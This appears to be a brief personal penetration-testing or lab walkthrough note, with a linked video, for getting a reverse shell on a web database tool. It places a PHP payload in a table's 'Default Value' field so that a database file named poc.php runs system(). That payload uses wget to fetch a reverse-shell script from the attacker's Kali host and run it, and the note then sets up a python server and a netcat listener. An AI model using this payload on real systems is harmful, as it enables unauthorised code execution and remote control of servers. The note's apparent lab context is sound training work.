Video Walkthrough
https://www.youtube.com/watch?v=mHsMCfg_KQw
#### reverse shell
```bash - kali
cp /usr/share/webshells/php/php-reverse-shell.php ./Shelly.txt
```
edit file to host and ip.
Create a new Database poc.php
Create a new table:
Paste the following php code in the "Default Value" textbox.
```bash - kali
<?php system("wget $KALI:80/Shelly.txt -O /tmp/Shelly.php; php /tmp/Shelly.php"); ?>
```
Below, we can see our table was created in `/usr/local/databases/poc.php`
Now we set up our python server.
![[Python#Server]]
set up your netcat listener
![[1._rlwrap]]
